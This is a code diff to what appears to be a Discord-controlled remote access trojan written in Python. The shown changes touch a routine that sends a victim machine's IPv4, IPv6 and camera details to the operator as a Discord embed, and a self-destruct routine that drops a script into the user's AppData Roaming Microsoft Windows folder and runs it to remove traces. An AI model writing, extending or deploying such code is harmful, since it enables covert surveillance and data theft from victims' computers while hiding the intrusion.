@@ -148,7 +148,7 @@ async def on_ready():
             Ipv6: {ipv6}
 
             Ipv4: {ipv4}
-            
+
             Cameras: {cameras}"""
 
             embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
@@ -341,8 +341,10 @@ sys.exit(0)
         script_file = "self-destruct.py"
         user_profile = os.environ['USERPROFILE']
         target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-        with open(os.path.join(target_path, script_file), "w") as file:
-            file.write(script_content)
+        if not os.path.exists(os.path.join(target_path, script_file)):
+            with open(os.path.join(target_path, script_file), "w") as file:
+                file.write(script_content)
+                file.close()
         subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
         sys.exit(0)
 
@@ -374,8 +376,10 @@ sys.exit(0)
     script_file = "self-destruct.py"
     user_profile = os.environ['USERPROFILE']
     target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-    with open(os.path.join(target_path, script_file), "w") as file:
-        file.write(script_content)
+    if not os.path.exists(os.path.join(target_path, script_file)):
+        with open(os.path.join(target_path, script_file), "w") as file:
+            file.write(script_content)
+            file.close()
     subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
     sys.exit(0)
     
